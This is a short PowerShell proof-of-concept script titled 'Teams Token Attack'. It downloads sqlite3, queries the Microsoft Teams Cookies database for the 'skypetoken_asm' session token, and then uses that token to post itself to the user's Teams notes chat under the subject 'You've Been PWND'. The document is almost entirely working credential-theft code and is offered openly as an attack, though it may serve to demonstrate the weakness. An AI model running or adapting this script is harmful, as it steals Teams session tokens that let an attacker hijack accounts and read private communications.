# --- Teams Token Attack --- #
# Author: Connor Peoples     #
# Date: August 8, 2022       #
# ---                    --- #

# --- Modules ---

# --- Variables ---
$Script:SQLitePath = ".\SQLite3\sqlite-tools-win32-x86-3390200\sqlite3.exe"
$Script:TeamsFolder = "~\AppData\Roaming\Microsoft\Teams"

# --- Functions ---
Function Get-Sqlite() {
    try {
        Write-Host " Downloading SQLite3 client"
        $Uri = "https://www.sqlite.org/2022/sqlite-tools-win32-x86-3390200.zip"
        Invoke-WebRequest `
            -Uri $Uri `
            -Method Get `
            -OutFile SQLite3.zip
        
        Write-Host " Expanding Sqllite zip."
        Expand-Archive SQLite3.zip -Force

        return $true
    } catch {
        Write-Host "`r`n Could not download or expand the file. Check network" `
            -ForegroundColor Red
        return $False
    }
}

# --- Logic ---

Set-Location $Script:TeamsFolder
if ( Get-Sqlite ) {
    " Getting token."
    $DBValue = Invoke-Expression  "$($Script:SqlitePath) Cookies `"Select value from cookies where name = 'skypetoken_asm';`""
    $TokenString = $DBValue -Replace '%..', ' '
    $TokenList = $TokenString.Split(' ')
    $Token = "skypetoken=$($TokenList[1])"

    " Token retrieved"


    
    $Header = @{
        authentication = $Token
        "content-type" = "application/json"
        "x-ms-client-request-id" = [guid]::NewGuid().ToString()
        "x-ms-client-session-id" = [guid]::NewGuid().ToString()
    }

    $id = ""
    (1..19) | ForEach-Object {  
        $id += Get-Random(1..9) 
    }

    $Url = "https://amer.ng.msg.teams.microsoft.com/v1/users/ME/conversations/48:notes/messages"
    $Body = @{
        content ="<p>$Token</p>"
        messagetype = "RichText/Html"
        contenttype = "text"
        amsreferences = @()
        clientmessageid = $id
        imdisplayname = "Threat Bot"
        properties = @{
            importance = "high"
            subject = "You've Been PWND"
        }
    }
    
    Invoke-RestMethod `
        -Uri $Url `
        -Method POST `
        -Headers $Header `
        -Body ($Body | ConvertTo-Json)


} else {
    " Aborting."
}

